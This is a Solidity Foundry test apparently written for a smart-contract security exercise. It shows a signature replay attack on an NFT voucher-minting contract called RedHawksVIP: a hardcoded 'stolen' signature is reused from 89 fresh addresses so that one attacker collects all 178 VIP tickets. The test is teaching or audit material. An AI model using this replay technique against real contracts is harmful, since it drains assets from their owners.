// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {RedHawksVIP} from "../../src/10. Replay Attack-3/RedHawksVIP.sol";
//import {RedHawksVIP} from "../../src/10. Replay Attack-3/RedHawksVIPSecured.sol";
import "forge-std/Test.sol";

contract TestRA3 is Test {
    using ECDSA for bytes32;

    RedHawksVIP public redHawksVIP;

    bytes32 private constant _TYPE_HASH = keccak256("EIP712Domain(uint256 chainId,address verifyingContract)");

    address deployer;
    uint256 deployerKey;
    address vouchersSigner;
    uint256 signerKey;
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        (deployer, deployerKey) = makeAddrAndKey("deployer");
        (vouchersSigner, signerKey) = makeAddrAndKey("vouchersSigner");

        redHawksVIP = new RedHawksVIP(vouchersSigner);

        vm.stopPrank();

        bytes32 dataHash = _hashTypedDataV4(
            keccak256(
                abi.encode(
                    keccak256("VoucherData(uint256 amountOfTickets,string password)"),
                    2,
                    keccak256(bytes("RedHawksRulzzz133")) // Only hash string
                )
            )
        );

        // Create signature
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, dataHash);
        bytes memory validSignature = abi.encodePacked(r, s, v);

        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(deployerKey, dataHash);
        bytes memory invalidSignature = abi.encodePacked(r2, s2, v2);

        // Invalid signature - reverts
        vm.prank(user);
        vm.expectRevert("Invalid voucher");
        redHawksVIP.mint(2, "RedHawksRulzzz133", invalidSignature);

        // Invalid data - reverts
        vm.prank(user);
        vm.expectRevert("Invalid voucher");
        redHawksVIP.mint(1, "wrongPassword", validSignature);

        // Can use valid voucher
        vm.prank(user);
        redHawksVIP.mint(2, "RedHawksRulzzz133", validSignature);
        assertEq(redHawksVIP.balanceOf(user), 2);

        // Replay attack - reverts
        vm.prank(user);
        vm.expectRevert("Voucher used");
        redHawksVIP.mint(2, "RedHawksRulzzz133", validSignature);
    }

    function testAttack() public {
        // Replay attack from different address

        string memory password = "RedHawksRulzzz133";
        // This signature is generated using the voucherSigner private key for the above password and amountOfTickets = 2

        bytes memory stolenSignature =
            hex"f93808afc0281cb72eabdbe920612c259d68c66c00bfdfc86a6eaa2c69b84aad39ce44eb89c9ffc1bfb5da0a44a81ac1dcac4d90f2a53b4015bd0f1cc9762bcd1b";
        // Attacker uses the same voucher 89 times to mint 178 tickets
        for (uint256 i = 0; i < 89; i++) {
            string memory name = string.concat("Attacker", vm.toString(i));
            address attackerUser = makeAddr(name);

            uint256 currentSupply = redHawksVIP.currentSupply();
            // Ensure we don't exceed max supply
            if (currentSupply >= redHawksVIP.MAX_SUPPLY()) {
                break;
            }

            vm.startPrank(attackerUser);
            redHawksVIP.mint(2, password, stolenSignature);

            redHawksVIP.transferFrom(attackerUser, attacker, 1 + currentSupply++);
            redHawksVIP.transferFrom(attackerUser, attacker, 1 + currentSupply++);
            vm.stopPrank();
        }

        //Attacker got all 178 VIP tickets
        assertEq(redHawksVIP.balanceOf(attacker), 178);
    }

    function _hashTypedDataV4(bytes32 structHash) internal view returns (bytes32) {
        bytes32 domainSeparator = keccak256(abi.encode(_TYPE_HASH, block.chainid, address(redHawksVIP)));
        return ECDSA.toTypedDataHash(domainSeparator, structHash);
    }
}
